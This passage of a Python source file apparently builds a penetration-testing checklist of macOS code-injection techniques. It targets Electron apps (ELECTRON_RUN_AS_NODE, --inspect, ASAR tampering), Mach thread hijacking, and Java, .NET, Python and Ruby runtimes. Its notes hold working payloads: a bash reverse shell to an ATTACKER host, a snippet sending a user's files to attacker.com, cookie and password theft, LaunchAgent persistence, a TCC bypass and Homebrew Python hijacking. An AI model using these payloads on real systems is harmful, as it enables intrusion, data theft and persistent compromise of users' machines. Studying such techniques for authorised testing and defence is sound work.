Many Electron apps ship with vulnerable fuse config

TIME ESTIMATE: 30 seconds per app
                        '''
                    }
                },

                # Task 2: ELECTRON_RUN_AS_NODE injection
                {
                    'id': 'electron-run-as-node',
                    'name': 'ELECTRON_RUN_AS_NODE Code Execution',
                    'type': 'command',
                    'metadata': {
                        'command': 'ELECTRON_RUN_AS_NODE=1 /Applications/TARGET.app/Contents/MacOS/TARGET -e "require(\'child_process\').execSync(\'/System/Applications/Calculator.app/Contents/MacOS/Calculator\')"',
                        'description': 'Execute arbitrary code using ELECTRON_RUN_AS_NODE environment variable',
                        'tags': ['OSCP:HIGH', 'ELECTRON', 'CODE_EXECUTION', 'QUICK_WIN'],
                        'flag_explanations': {
                            'ELECTRON_RUN_AS_NODE=1': 'Run Electron as Node.js process instead of browser',
                            '-e': 'Evaluate Node.js expression/code',
                            'require(\'child_process\')': 'Load Node.js child process module',
                            'execSync': 'Synchronous process execution'
                        },
                        'success_indicators': [
                            'Calculator opens (or specified app)',
                            'Node.js REPL starts if no -e flag',
                            'Command executes without errors'
                        ],
                        'failure_indicators': [
                            'RunAsNode fuse disabled (app ignores env var)',
                            'Permission denied',
                            'ELECTRON_RUN_AS_NODE not recognized'
                        ],
                        'next_steps': [
                            'Interactive shell: ELECTRON_RUN_AS_NODE=1 APP.app (then require("child_process").execSync("/bin/bash"))',
                            'Reverse shell: execSync("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")',
                            'Read files: require("fs").readFileSync("/etc/passwd", "utf8")',
                            'Steal cookies: require("electron").webContents.getAllWebContents()[0].session.cookies.get({})'
                        ],
                        'alternatives': [
                            'Load external script: ELECTRON_RUN_AS_NODE=1 APP.app /tmp/payload.js',
                            'NODE_OPTIONS: NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 APP.app',
                            'LaunchAgent persistence: Add env var to plist',
                            'Inspect mode: ELECTRON_RUN_AS_NODE=1 APP.app --inspect=9229'
                        ],
                        'notes': '''
ELECTRON_RUN_AS_NODE:
When set, Electron starts as Node.js instead of Chromium.
Inherits TCC permissions from application.

PAYLOADS:

1. Calculator PoC:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')

2. Reverse shell:
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"')

3. Exfiltrate data:
var fs = require('fs');
var data = fs.readFileSync(process.env.HOME + '/Documents/secret.txt', 'utf8');
require('https').get('https://attacker.com/?d=' + encodeURIComponent(data));

4. Persistence:
fs.writeFileSync(
  process.env.HOME + '/Library/LaunchAgents/com.persistence.plist',
  plist_content
);

LAUNCHAGENT PLIST:
<dict>
    <key>EnvironmentVariables</key>
    <dict>
        <key>ELECTRON_RUN_AS_NODE</key>
        <string>true</string>
    </dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/TARGET.app/Contents/MacOS/TARGET</string>
        <string>-e</string>
        <string>require('child_process').execSync('PAYLOAD')</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>

DETECTION:
- ES_EVENT_TYPE_NOTIFY_EXEC with ELECTRON_RUN_AS_NODE env
- Process with "Electron" + "-e" arguments

TIME ESTIMATE: < 30 seconds if fuse vulnerable
                        '''
                    }
                },

                # Task 3: Electron --inspect injection
                {
                    'id': 'electron-inspect-injection',
                    'name': 'Electron Remote Debugging Injection (--inspect)',
                    'type': 'command',
                    'metadata': {
                        'command': '/Applications/TARGET.app/Contents/MacOS/TARGET --inspect=9229 &\nsleep 2\nopen chrome://inspect',
                        'description': 'Start Electron app with remote debugging for code injection via Chrome DevTools',
                        'tags': ['OSCP:HIGH', 'ELECTRON', 'CODE_EXECUTION', 'MANUAL'],
                        'flag_explanations': {
                            '--inspect=9229': 'Enable Node.js inspector on port 9229',
                            '--inspect-brk': 'Enable inspector and break before user code (bypass protections)',
                            '--remote-debugging-port=9222': 'Enable Chrome DevTools Protocol on port 9222',
                            'chrome://inspect': 'Chrome inspector to connect to debugging targets'
                        },
                        'success_indicators': [
                            'Debugging port opened (lsof -i :9229)',
                            'Chrome inspector shows target',
                            'Can execute JavaScript in console'
                        ],
                        'failure_indicators': [
                            'EnableNodeCliInspectArguments fuse disabled',
                            'App has custom protection checking for --inspect',
                            'Port already in use'
                        ],
                        'next_steps': [
                            'Open chrome://inspect in Chrome/Edge',
                            'Click "inspect" on target',
                            'In console: require(\'child_process\').execSync(\'PAYLOAD\')',
                            'Dump cookies: await chrome.send("Network.getAllCookies")',
                            'Steal credentials from DOM: document.getElementById("password").value'
                        ],
                        'alternatives': [
                            '--inspect-brk to pause at start (bypass custom protections)',
                            '--remote-debugging-port=9222 for Chromium debugging',
                            'WebSocket connection: ws://127.0.0.1:9229/UUID',
                            'Automated: WhiteChocolateMacademiaNut tool for cookie dumping'
                        ],
                        'notes': '''
ELECTRON DEBUGGING:

--inspect FLAGS:
- --inspect: Enable debugging
- --inspect=PORT: Specify port
- --inspect-brk: Break before code executes
- --remote-debugging-port: Chromium DevTools protocol

BYPASS CUSTOM PROTECTIONS:
Some apps check for --inspect in process.argv.
Use --inspect-brk to pause execution, then:

// In DevTools console before resume:
process.argv = ['/Applications/App.app/Contents/MacOS/App'];

COOKIE DUMPING:
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/UUID", suppress_origin=True)
ws.send('{"id": 1, "method": "Network.getAllCookies"}')
print(ws.recv())

CREDENTIAL THEFT:
var { webContents } = require('electron');
var wc = webContents.getAllWebContents()[0];

wc.executeJavaScript(`
    document.getElementById('password').value
`).then(password => {
    require('fs').writeFileSync('/tmp/creds.txt', password);
});

TOOLS:
- WhiteChocolateMacademiaNut: Cookie dumper
- electroniz3r: Electron app vulnerability scanner

LAUNCHAGENT PERSISTENCE:
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/TARGET.app/Contents/MacOS/TARGET</string>
        <string>--inspect</string>
    </array>
</dict>

CVE-2024-23738 (2024):
Many apps still vulnerable to --inspect injection

TIME ESTIMATE: 1-2 minutes
                        '''
                    }
                },

                # Task 4: ASAR file modification
                {
                    'id': 'electron-asar-modification',
                    'name': 'Modify Electron ASAR for Code Injection',
                    'type': 'command',
                    'metadata': {
                        'command': 'npx asar extract /Applications/TARGET.app/Contents/Resources/app.asar /tmp/app-decomp 2>/dev/null || echo "Install: npm install -g asar"',
                        'description': 'Extract and modify app.asar to inject malicious JavaScript',
                        'tags': ['OSCP:MEDIUM', 'ELECTRON', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            'npx asar extract': 'Extract asar archive (Electron app package)',
                            'app.asar': 'Main application code archive',
                            'npx asar pack': 'Repack modified files into asar'
                        },
                        'success_indicators': [
                            'app.asar extracted to directory',
                            'JavaScript files visible and modifiable',
                            'Repacked app.asar successfully'
                        ],
                        'failure_indicators': [
                            'EnableEmbeddedAsarIntegrityValidation enabled (asar verified)',
                            'OnlyLoadAppFromAsar enabled (directory ignored)',
                            'kTCCServiceSystemPolicyAppBundles permission required (macOS 10.15+)'
                        ],
                        'next_steps': [
                            'Find main entry: cat app-decomp/package.json | grep \'"main"\' ',
                            'Inject payload: echo \'require("child_process").execSync("PAYLOAD")\' >> app-decomp/main.js',
                            'Repack: npx asar pack /tmp/app-decomp /tmp/app-new.asar',
                            'Replace: cp /tmp/app-new.asar /Applications/TARGET.app/Contents/Resources/app.asar',
                            'Launch app: open /Applications/TARGET.app'
                        ],
                        'alternatives': [
                            'Bypass TCC: cp -r TARGET.app /tmp && rename Contents to NotCon, modify, rename back',
                            'Add preload script: modify package.json to add "main": "inject.js"',
                            'Hijack existing module: modify node_modules/MODULE/index.js',
                            'CVE-2023-44402: Create directory named app.asar instead of archive'
                        ],
                        'notes': '''
ASAR MODIFICATION PROCESS:

1. EXTRACT:
npx asar extract app.asar app-decomp

2. FIND ENTRY POINT:
cat app-decomp/package.json

{
  "name": "myapp",
  "main": "main.js"  ← Entry point
}

3. INJECT CODE:
Add to top of main.js:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

4. REPACK:
npx asar pack app-decomp app-new.asar

5. REPLACE:
cp app-new.asar APP.app/Contents/Resources/app.asar

BYPASS TCC (kTCCServiceSystemPolicyAppBundles):
# Copy to writable location
cp -r /Applications/TARGET.app /tmp/

# Rename Contents folder (bypass protection)
mv /tmp/TARGET.app/Contents /tmp/TARGET.app/NotCon

# Modify asar
npx asar extract /tmp/TARGET.app/NotCon/Resources/app.asar /tmp/app-decomp
# ... inject code ...
npx asar pack /tmp/app-decomp /tmp/TARGET.app/NotCon/Resources/app.asar

# Rename back
mv /tmp/TARGET.app/NotCon /tmp/TARGET.app/Contents

# Execute
/tmp/TARGET.app/Contents/MacOS/TARGET

CVE-2023-44402 (Electron ≤22.3.23):
Create directory named "app.asar" instead of archive file.
Place malicious JavaScript inside.
OnlyLoadAppFromAsar fuse bypassed.

PAYLOADS:
- Reverse shell
- Keylogger
- Credential theft
- Persistence installation

TIME ESTIMATE: 3-5 minutes
                        '''
                    }
                },

                # Task 5: Enumerate Electron apps
                {
                    'id': 'electron-enumerate-apps',
                    'name': 'Enumerate Installed Electron Applications',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Applications -maxdepth 3 -name "*.app" 2>/dev/null | while read app; do strings "$app/Contents/MacOS/"* 2>/dev/null | grep -q "Electron" && echo "[ELECTRON] $app"; done',
                        'description': 'Find Electron applications for injection targeting',
                        'tags': ['OSCP:HIGH', 'ELECTRON', 'ENUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'find /Applications -maxdepth 3': 'Search Applications up to 3 levels',
                            'strings': 'Extract printable strings from binary',
                            'grep -q "Electron"': 'Check if binary contains "Electron" string'
                        },
                        'success_indicators': [
                            '[ELECTRON] prefix showing Electron apps',
                            'Common apps: VS Code, Slack, Discord, Signal'
                        ],
                        'failure_indicators': [
                            'No Electron apps found',
                            'Permission denied on protected folders'
                        ],
                        'next_steps': [
                            'Check fuses for each: npx @electron/fuses read --app APP.app',
                            'Test ELECTRON_RUN_AS_NODE: ELECTRON_RUN_AS_NODE=1 APP.app',
                            'Check TCC entitlements: codesign -dv --entitlements :- APP.app',
                            'Prioritize apps with camera/microphone/contacts entitlements'
                        ],
                        'alternatives': [
                            'Check version: strings APP.app/Contents/Frameworks/Electron\\ Framework.framework/Electron\\ Framework | grep "Chrome/"',
                            'Find asar: find APP.app -name "app.asar"',
                            'electroniz3r tool: ./electroniz3r list-apps'
                        ],
                        'notes': '''
COMMON ELECTRON APPS:
- Visual Studio Code
- Slack
- Discord
- Signal
- GitHub Desktop
- Postman
- Notion
- Obsidian
- Atom

HIGH-VALUE TARGETS:
1. Apps with TCC entitlements (check with codesign -dv --entitlements :-)
2. Apps accessing sensitive data (password managers, browsers)
3. Apps with network access (chat, dev tools)
4. Apps running persistently (menu bar apps)

ELECTRONIZ3R TOOL:
./electroniz3r list-apps
./electroniz3r verify "/Applications/APP.app"
./electroniz3r inject "/Applications/APP.app" --predefined-script bindShell

FUSE TIMELINE:
- Pre-2023: Most apps vulnerable
- 2023+: Hardening recommendations published
- 2024: CVE cluster (CVE-2024-23738-23743)

TIME ESTIMATE: 1-2 minutes for enumeration
                        '''
                    }
                }
            ]
        }

    # ==================== THREAD INJECTION ====================

    def _create_thread_injection_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for thread injection via task ports"""
        return {
            'id': 'thread-injection-parent',
            'name': 'Thread Injection via Task Ports',
            'type': 'parent',
            'children': [
                # Task 1: Get task port
                {
                    'id': 'task-port-get',
                    'name': 'Obtain Task Port for Process Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Acquire task port of target process for thread injection',
                        'tags': ['OSCP:MEDIUM', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'alternatives': [
                            'task_for_pid(): Requires root or same uid or com.apple.security.get-task-allow',
                            'processor_set_tasks(): Get all tasks (requires root)',
                            'Inherit from parent: Fork and inherit task port',
                            'XPC service: Exploit XPC service to get task port'
                        ],
                        'notes': '''
TASK PORT ACQUISITION:

1. task_for_pid(mach_task_self(), pid, &task):
   - Requires one of:
     * Root privileges
     * Same UID as target
     * Target has com.apple.security.get-task-allow entitlement
     * Caller has task_for_pid-allow entitlement (only Apple)

2. processor_set_tasks():
   - Get all running tasks
   - Requires root
   - Returns array of task ports

3. RESTRICTIONS:
   - SIP prevents task ports for Apple binaries
   - Hardened runtime blocks task_for_pid on protected apps
   - EndpointSecurity can monitor: ES_EVENT_TYPE_AUTH_GET_TASK

EXAMPLE CODE:
#include <mach/mach.h>

kern_return_t kr;
mach_port_t task;
pid_t target_pid = 1234;

kr = task_for_pid(mach_task_self(), target_pid, &task);
if (kr != KERN_SUCCESS) {
    printf("task_for_pid failed: %s\n", mach_error_string(kr));
    return -1;
}

// Now you have task port for injection

DETECTION:
ES_EVENT_TYPE_AUTH_GET_TASK event shows:
- Source PID requesting
- Target PID
- Result (allowed/denied)

LEGITIMATE USE CASES:
- Debuggers (lldb, gdb)
- Process monitors (Activity Monitor)
- Dtrace/Instruments
                        '''
                    }
                },

                # Task 2: Thread hijacking
                {
                    'id': 'thread-hijacking-basic',
                    'name': 'Thread Hijacking for Code Execution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Hijack existing thread to execute shellcode via task port',
                        'tags': ['OSCP:HIGH', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'alternatives': [
                            'Use threadexec library: https://github.com/bazad/threadexec',
                            'task_vaccine PoC: https://github.com/rodionovd/task_vaccine',
                            'Manual implementation: suspend -> modify registers -> resume'
                        ],
                        'notes': '''
THREAD HIJACKING PROCESS:

1. GET THREAD LIST:
   task_threads(task_port, &thread_list, &thread_count)

2. SUSPEND TARGET THREAD:
   thread_suspend(thread)

3. GET/SET THREAD STATE:
   thread_get_state(thread, ARM_THREAD_STATE64, &state, &count)
   // Modify state.pc, state.x0-x7 (arguments)
   thread_set_state(thread, ARM_THREAD_STATE64, &state, count)

4. RESUME THREAD:
   thread_resume(thread)

REGISTER MANIPULATION:
- x0-x7: Function arguments
- pc: Instruction pointer (set to function address)
- lr: Link register (set to return address)
- sp: Stack pointer

EXECUTION PATTERN:
1. Set x0-x7 to function arguments
2. Set pc to function address
3. Set lr to infinite loop or exception handler
4. Resume thread
5. Monitor thread state until pc == lr
6. Read return value from x0

EXAMPLE (call property_getName):
// property_getName() is in libobjc:
// const char *property_getName(objc_property_t prop)
// In assembly: ldr x0, [x0]; ret

arm_thread_state64_t state;
thread_get_state(thread, ARM_THREAD_STATE64, &state, &count);

// Set argument (property address)
state.__x[0] = property_address;

// Set PC to property_getName
state.__pc = property_getName_address;

// Set LR to infinite loop for detection
state.__lr = infinite_loop_address;

thread_set_state(thread, ARM_THREAD_STATE64, &state, count);
thread_resume(thread);

// Wait for completion
while (state.__pc != infinite_loop_address) {
    thread_get_state(thread, ARM_THREAD_STATE64, &state, &count);
}

// Read return value
const char *name = (const char *)state.__x[0];

LIMITATIONS:
- Cannot create new threads (thread_create_running blocked)
- Must reuse existing thread
- PAC (Pointer Authentication) on Apple Silicon requires signing pointers

APPLE SILICON (arm64e) PAC:
// Sign pointer before setting PC
uint64_t ptr = (uint64_t)function;
ptr = ptrauth_sign_unauthenticated((void*)ptr, ptrauth_key_asia, 0);
state.__pc = ptr;

DETECTION:
ES_EVENT_TYPE_NOTIFY_THREAD_SET_STATE (macOS 14+)

TOOLS:
- threadexec: Full injection library
- task_vaccine: PAC-aware PoC
                        '''
                    }
                },

                # Task 3: Shared memory setup
                {
                    'id': 'shared-memory-injection',
                    'name': 'Shared Memory for Bi-directional Communication',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Establish shared memory between injector and target for data transfer',
                        'tags': ['OSCP:MEDIUM', 'MACOS', 'CODE_INJECTION', 'MANUAL'],
                        'alternatives': [
                            'xpc_shmem_create(): Create shared memory object',
                            'Mach memory entries: mach_make_memory_entry()',
                            'Mach ports: Send data via mach_msg()'
                        ],
                        'notes': '''
SHARED MEMORY VIA XPC:

1. ALLOCATE MEMORY:
   vm_address_t address;
   mach_vm_allocate(mach_task_self(), &address, size, VM_FLAGS_ANYWHERE);

2. CREATE XPC SHARED MEMORY:
   xpc_object_t shmem = xpc_shmem_create((void*)address, size);

3. GET MACH MEMORY ENTRY:
   mach_port_t entry = xpc_shmem_get_mach_mem_entry(shmem);

4. INSERT SEND RIGHT IN REMOTE PROCESS:
   mach_port_insert_right(task, entry_name, entry, MACH_MSG_TYPE_MAKE_SEND);

5. MAP IN REMOTE PROCESS (via remote execution):
   vm_address_t remote_address;
   mach_vm_map(mach_task_self(), &remote_address, size, 0,
               VM_FLAGS_ANYWHERE, entry, 0, FALSE,
               VM_PROT_READ|VM_PROT_WRITE,
               VM_PROT_READ|VM_PROT_WRITE,
               VM_INHERIT_NONE);

MACH PORTS FOR COMMUNICATION:

1. CREATE LOCAL PORT:
   mach_port_t local_port;
   mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &local_port);

2. INSERT IN REMOTE VIA THREAD SPECIAL PORT:
   thread_set_special_port(remote_thread, THREAD_KERNEL_PORT, local_port);

3. GET FROM REMOTE:
   // Remote executes: mach_thread_self()
   // Returns send right to local_port

4. CREATE REMOTE PORT:
   // Remote executes: mach_reply_port()
   // Stores in thread special port
   // Local retrieves: thread_get_special_port()

BI-DIRECTIONAL COMMUNICATION:
Once both ports established:
- Local -> Remote: mach_msg() to remote_port
- Remote -> Local: mach_msg() to local_port

MEMORY READ/WRITE PRIMITIVES:
void read_memory(void *addr, size_t len, void *buffer) {
    memcpy(shared_memory, (void*)addr, len);
    memcpy(buffer, shared_memory, len);
}

void write_memory(void *addr, void *data, size_t len) {
    memcpy(shared_memory, data, len);
    memcpy((void*)addr, shared_memory, len);
}

THREADEXEC LIBRARY:
Provides high-level API abstracting this complexity:
- threadexec_call()
- threadexec_read()
- threadexec_write()
- threadexec_allocate()

FULL PROCESS CONTROL:
With shared memory + thread exec:
- Arbitrary memory read/write
- Function calls with >8 arguments (via stack)
- Mach port transfer
- File descriptor transfer (via fileports)
                        '''
                    }
                }
            ]
        }

    # ==================== LANGUAGE-SPECIFIC INJECTION ====================

    def _create_language_injection_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for language-specific injection (Java, .NET, Python, Ruby, Perl)"""
        return {
            'id': 'language-injection-parent',
            'name': 'Language-Specific Injection Techniques',
            'type': 'parent',
            'children': [
                # JAVA
                {
                    'id': 'java-injection-java-options',
                    'name': 'Java Injection via _JAVA_OPTIONS',
                    'type': 'command',
                    'metadata': {
                        'command': 'export _JAVA_OPTIONS=\'-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"\' && echo \'#!/bin/bash\nopen /Applications/Calculator.app\' > /tmp/payload.sh && chmod +x /tmp/payload.sh',
                        'description': 'Inject commands into Java applications via _JAVA_OPTIONS environment variable',
                        'tags': ['OSCP:HIGH', 'JAVA', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            '_JAVA_OPTIONS': 'Environment variable for Java VM parameters (auto-loaded)',
                            '-Xms2m': 'Initial heap size 2MB (low to trigger OOM)',
                            '-Xmx5m': 'Maximum heap size 5MB (low to trigger OOM)',
                            '-XX:OnOutOfMemoryError': 'Command to execute when OutOfMemoryError occurs'
                        },
                        'success_indicators': [
                            'Java app inherits _JAVA_OPTIONS',
                            'OutOfMemoryError triggered',
                            'Payload script executed'
                        ],
                        'failure_indicators': [
                            'Java app doesn\'t trigger OOM',
                            'Environment variable ignored',
                            'Payload script not executable'
                        ],
                        'next_steps': [
                            r'Find Java apps: find /Applications -name "Info.plist" -exec grep -l "java\." {} \;',
                            'Test injection: open --env "_JAVA_OPTIONS=-XX:OnOutOfMemoryError=/tmp/payload.sh" /Applications/JAVA_APP.app',
                            'Stealthier: Use Java agent instead (no OOM required)',
                            'Persistence: Add to LaunchAgent with env vars'
                        ],
                        'alternatives': [
                            'Java agent: export _JAVA_OPTIONS="-javaagent:/tmp/Agent.jar"',
                            'JAVA_TOOL_OPTIONS env var (alternative)',
                            'Modify vmoptions file in app bundle',
                            'JVM_OPTS for specific applications'
                        ],
                        'notes': r'''
JAVA AGENT (STEALTH METHOD):

1. CREATE AGENT:
// Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
    public static void premain(String args, Instrumentation inst) {
        try {
            String[] cmd = {"/usr/bin/open", "-a", "Calculator"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {}
    }
}

2. COMPILE:
javac Agent.java
jar cvfm Agent.jar manifest.txt Agent.class

3. MANIFEST (manifest.txt):
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true

4. INJECT:
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
open /Applications/JAVA_APP.app

# Or directly:
open --env "_JAVA_OPTIONS=-javaagent:/tmp/Agent.jar" -a "JAVA_APP"

FIND JAVA APPS:
sudo find /Applications -name 'Info.plist' -exec grep -l "java\\." {} \\;

Examples:
- Burp Suite
- Android Studio
- IntelliJ IDEA
- Eclipse

VMOPTIONS FILE:
Some Java apps load .vmoptions file for parameters.
Locations:
- APP.app/Contents/vmoptions.txt
- ~/Library/Preferences/APP/app.vmoptions
- Include directives can reference other files

ANDROID STUDIO EXAMPLE:
/Applications/Android Studio.app/Contents/bin/studio.vmoptions

Add line:
-XX:OnOutOfMemoryError=/tmp/payload.sh

PERSISTENCE PLIST:
<dict>
    <key>EnvironmentVariables</key>
    <dict>
        <key>_JAVA_OPTIONS</key>
        <string>-javaagent:/Users/Shared/.agent.jar</string>
    </dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/JAVA_APP.app/Contents/MacOS/JavaApplicationStub</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>

JAVA VERSION COMPATIBILITY:
Agent must match app Java version or may crash

TIME ESTIMATE: 3-5 minutes
                        '''
                    }
                },

                # .NET
                {
                    'id': 'dotnet-injection-debugging',
                    'name': '.NET Application Injection via Debugging',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject code into .NET applications via debugging protocol (dbgtransportsession)',
                        'tags': ['OSCP:MEDIUM', 'DOTNET', 'CODE_INJECTION', 'MANUAL'],
                        'alternatives': [
                            'Find debug pipes: ls $TMPDIR/dotnet-diagnostic-*',
                            'Connect to -out pipe for sending commands',
                            'Connect to -in pipe for receiving responses',
                            'Send MT_SessionRequest to establish debugging session',
                            'Use MT_ReadMemory / MT_WriteMemory for injection'
                        ],
                        'notes': '''
.NET CORE DEBUGGING INJECTION:

1. FIND DEBUG PIPES:
   ls $TMPDIR/dotnet-diagnostic-*-*-in
   ls $TMPDIR/dotnet-diagnostic-*-*-out

2. ESTABLISH DEBUG SESSION:
   // Open -out pipe for writing
   int wr = open(OUT_PIPE, O_WRONLY);

   // Open -in pipe for reading
   int rd = open(IN_PIPE, O_RDONLY);

   // Send SessionRequest
   MessageHeader header;
   header.m_eType = MT_SessionRequest;
   header.TypeSpecificData.VersionInfo.m_dwMajorVersion = 2;
   header.TypeSpecificData.VersionInfo.m_dwMinorVersion = 0;
   header.m_cbDataBlock = sizeof(SessionRequestData);

   write(wr, &header, sizeof(MessageHeader));

   SessionRequestData data;
   memset(&data.m_sSessionID, 9, sizeof(SessionRequestData));
   write(wr, &data, sizeof(SessionRequestData));

   // Read response
   read(rd, &response, sizeof(MessageHeader));

3. READ MEMORY:
   header.m_eType = MT_ReadMemory;
   header.TypeSpecificData.MemoryAccess.m_pbAddr = target_address;
   header.TypeSpecificData.MemoryAccess.m_cbMemory = length;

   write(wr, &header, sizeof(MessageHeader));
   read(rd, buffer, length);

4. WRITE MEMORY:
   header.m_eType = MT_WriteMemory;
   header.TypeSpecificData.MemoryAccess.m_pbAddr = target_address;
   header.TypeSpecificData.MemoryAccess.m_cbMemory = length;

   write(wr, &header, sizeof(MessageHeader));
   write(wr, payload, length);

5. CODE EXECUTION:
   // Find Dynamic Function Table in libcorclr.dll
   // Overwrite function pointer with shellcode address

   // Get DFT location via MT_GetDCB
   // Write shellcode to rwx region (found via vmmap)
   // Overwrite DFT entry with shellcode address

FIND RWX MEMORY:
vmmap PID | grep "rwx/rwx"

POWERSHELL INJECTION EXAMPLE:
// Find PowerShell process
ps aux | grep pwsh

// Find debug pipes
ls $TMPDIR/dotnet-diagnostic-$(pgrep pwsh)-*

// Full PoC:
https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6

MESSAGE TYPES:
- MT_SessionRequest: Establish debugging
- MT_ReadMemory: Read process memory
- MT_WriteMemory: Write process memory
- MT_GetDCB: Get debugger control block info

DYNAMIC FUNCTION TABLE (DFT):
Located in libcorclr.dll
Array of JIT helper function pointers
Overwriting entry -> code execution when JIT called

NO PROTECTIONS:
.NET debugging not protected by:
- macOS hardened runtime
- Code signing
- SIP (for third-party .NET apps)

TIME ESTIMATE: 10-15 minutes
                        '''
                    }
                },

                # PYTHON
                {
                    'id': 'python-injection-homebrew',
                    'name': 'Python Hijacking (Homebrew Installation)',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /opt/homebrew/bin/python3 && cat > /tmp/python3_hijack.sh << \'EOF\'\n#!/bin/bash\n# Hijack code here\n/opt/homebrew/bin/python3.original "$@"\nEOF',
                        'description': 'Hijack Homebrew Python installation (writable by admin users)',
                        'tags': ['OSCP:MEDIUM', 'PYTHON', 'PERSISTENCE', 'MANUAL'],
                        'flag_explanations': {
                            '/opt/homebrew/bin/python3': 'Homebrew Python (writable by admin)',
                            'mv python3 python3.original': 'Backup original binary',
                            '#!/bin/bash': 'Wrapper script',
                            '"$@"': 'Pass all arguments to original Python'
                        },
                        'success_indicators': [
                            'Homebrew Python installed',
                            'User in admin group (can write to /opt/homebrew)',
                            'Wrapper script executes payload before Python'
                        ],
                        'failure_indicators': [
                            'Python not installed via Homebrew',
                            'Permission denied (not admin)',
                            '/opt/homebrew owned by root'
                        ],
                        'next_steps': [
                            'Backup original: sudo mv /opt/homebrew/bin/python3 /opt/homebrew/bin/python3.original',
                            'Create wrapper with payload + call to original',
                            'Make executable: sudo chmod +x /opt/homebrew/bin/python3',
                            'Test: python3 -c "print(\'test\')"',
                            'Even root will execute hijacked code'
                        ],
                        'alternatives': [
                            'PYTHONSTARTUP env var (sets startup script for interactive sessions)',
                            'PYTHONPATH env var (add malicious module directory)',
                            'PYTHONHOME env var (change Python installation location)',
                            'Modify site-packages: /opt/homebrew/lib/python3.X/site-packages/sitecustomize.py'
                        ],
                        'notes': '''
HOMEBREW PYTHON HIJACKING:

VULNERABILITY:
Homebrew installs to /opt/homebrew (Apple Silicon) or /usr/local (Intel)
Default permissions allow admin users to write

WRAPPER SCRIPT:
#!/bin/bash
# Payload (persistence, exfiltration, etc.)
/Applications/Calculator.app/Contents/MacOS/Calculator &

# Call original Python
/opt/homebrew/bin/python3.original "$@"

INSTALLATION:
sudo mv /opt/homebrew/bin/python3 /opt/homebrew/bin/python3.original
sudo cp /tmp/python3_hijack.sh /opt/homebrew/bin/python3
sudo chmod +x /opt/homebrew/bin/python3

IMPACT:
- All Python executions hijacked (including root)
- Persistence across reboots
- Affects system scripts, cron jobs, LaunchDaemons

PYTHON ENV VAR INJECTION (Less reliable):
PYTHONSTARTUP=/tmp/startup.py python3
# Only works for interactive sessions, not scripts

PYTHONPATH=/tmp:$PYTHONPATH python3 script.py
# Only works if script imports from added path

sitecustomize.py (RECOMMENDED):
Create /opt/homebrew/lib/python3.X/site-packages/sitecustomize.py:

import os
os.system('/Applications/Calculator.app/Contents/MacOS/Calculator &')

# Auto-executed by every Python invocation

DETECTION:
- File integrity monitoring on /opt/homebrew/bin
- Check for .original backups
- Monitor Python execution with ES events

PYINSTALLER LIMITATION:
Compiled Python apps (pyinstaller) don't use env vars
Must hijack system Python or target app-bundled Python

TIME ESTIMATE: 2-3 minutes
                        '''
                    }
                },

                # RUBY
                {
                    'id': 'ruby-injection-env-vars',
                    'name': 'Ruby Injection via Environment Variables',
                    'type': 'command',
                    'metadata': {
                        'command': 'export RUBYOPT="-r/tmp/payload.rb" && echo \'exec "/Applications/Calculator.app/Contents/MacOS/Calculator"\' > /tmp/payload.rb',
                        'description': 'Inject malicious Ruby code via RUBYOPT environment variable',
                        'tags': ['OSCP:LOW', 'RUBY', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            'RUBYOPT': 'Ruby options environment variable (auto-loaded)',
                            '-r FILE': 'Require (load) FILE before executing script',
                            'exec': 'Replace current Ruby process with command'
                        },
                        'success_indicators': [
                            'RUBYOPT environment variable set',
                            'Ruby script requires payload.rb',
                            'Payload executes before main script'
                        ],
                        'failure_indicators': [
                            'Ruby ignores RUBYOPT (security restrictions)',
                            'Payload file not found',
                            'Syntax errors in payload'
                        ],
                        'next_steps': [
                            'Find Ruby apps: find /Applications -name "*.app" -exec sh -c \'strings "$1/Contents/MacOS/"* | grep -q "ruby" && echo "$1"\' _ {} \\;',
                            'Test: ruby -e "puts \\"test\\""',
                            'Persistence: Add RUBYOPT to LaunchAgent',
                            'Target Homebrew Ruby: /opt/homebrew/bin/ruby'
                        ],
                        'alternatives': [
                            'RUBYLIB env var: export RUBYLIB=/tmp:$RUBYLIB',
                            'Hijack Homebrew Ruby (like Python)',
                            'Modify gem: /opt/homebrew/lib/ruby/gems/X.X.X/gems/GEM/lib/GEM.rb',
                            '~/.irbrc for interactive Ruby sessions'
                        ],
                        'notes': '''
RUBY ENVIRONMENT VARIABLES:

RUBYOPT:
export RUBYOPT="-r/tmp/payload.rb"
# Payload auto-loaded before any script

RUBYLIB:
export RUBYLIB=/tmp:$RUBYLIB
# Add /tmp to Ruby load path
